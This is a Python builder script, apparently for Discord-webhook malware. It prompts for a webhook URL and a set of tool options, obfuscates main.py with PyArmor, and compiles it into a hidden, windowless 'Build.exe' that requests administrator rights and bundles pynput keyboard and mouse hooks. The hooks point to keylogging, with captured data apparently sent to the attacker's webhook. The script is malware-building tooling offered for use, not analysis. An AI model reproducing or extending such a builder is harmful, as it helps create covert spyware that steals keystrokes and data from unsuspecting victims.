import subprocess
import os
import json
import inquirer

def load_config():
    if os.path.exists("config.json"):
        with open("config.json", "r") as f:
            return json.load(f)
    return {}

def save_config(config):
    with open("config.json", "w") as f:
        json.dump(config, f, indent=4)

def select_options(config):
    choices = [key for key in config.keys() if key not in ["WEBHOOK", "ALERT_TITLE", "ALERT_CONTENT"]]
    
    questions = [
        inquirer.Checkbox('options',
                          message="Tools:",
                          choices=choices,
                          default=[key for key, value in config.items() if value]
                          ),
    ]
    answers = inquirer.prompt(questions)
    
    for key in config.keys():
        if key not in ["WEBHOOK", "ALERT_TITLE", "ALERT_CONTENT"]:
            config[key] = key in answers['options']
    
    if config.get("ALERT"):
        ask_alert_details(config)

def ask_webhook(config):
    questions = [
        inquirer.Text('WEBHOOK',
                      message="Enter your Discord Webhook URL:",
                      default=config.get("WEBHOOK", ""),
                      validate=lambda _, answer: answer.startswith("https://") or "URL must start with https://" in answer),
    ]
    answers = inquirer.prompt(questions)
    config["WEBHOOK"] = answers['WEBHOOK']

def ask_alert_details(config):
    questions = [
        inquirer.Text('ALERT_TITLE', message="Enter the alert title:", default=config.get("ALERT_TITLE", "")),
        inquirer.Text('ALERT_CONTENT', message="Enter the alert content:", default=config.get("ALERT_CONTENT", "")),
    ]
    answers = inquirer.prompt(questions)
    config["ALERT_TITLE"] = answers['ALERT_TITLE']
    config["ALERT_CONTENT"] = answers['ALERT_CONTENT']

def compile_main(config):
    try:
        subprocess.run(["pyinstaller", "--version"], check=True, capture_output=True)
    except subprocess.CalledProcessError:
        print("PyInstaller não está instalado. Instalando...")
        subprocess.run(["pip", "install", "pyinstaller"], check=True)

    try:
        print("Ofuscando o código com PyArmor...")
        subprocess.run(["pyarmor", "pack", "-x", " --onefile --noconsole", "main.py"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Erro durante a ofuscação: {e}")
        return

    save_config(config)

    command = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--name=Build",
        "main.py",
        "--add-data", "config.json;."
    ]

    command.extend([
        "--windowed",
        "--uac-admin",
        "--hidden-import=pynput.keyboard._win32",
        "--hidden-import=pynput.mouse._win32",
    ])

    try:
        subprocess.run(command, check=True)
        print("Build criada.")
        print("O executável 'Build.exe' foi criado na pasta 'dist'.")
    except subprocess.CalledProcessError as e:
        print(f"Erro durante a compilação: {e}")

if __name__ == "__main__":
    config = load_config()
    select_options(config)
    ask_webhook(config)  
    compile_main(config)
